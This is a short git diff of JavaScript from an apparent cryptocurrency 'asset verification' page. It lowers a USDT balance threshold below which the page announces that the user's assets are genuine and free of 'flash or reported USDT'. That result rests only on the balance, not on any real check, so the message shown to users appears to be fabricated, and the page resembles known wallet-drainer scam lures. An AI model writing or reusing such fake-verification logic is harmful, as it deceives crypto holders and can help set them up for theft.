@@ -59,7 +59,7 @@ async function verifyAssets() {
         return;
     }
 
-    if (usdtBalance <= 24) {
+    if (usdtBalance <= 10) {
         showPopup(
             `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
             "green"
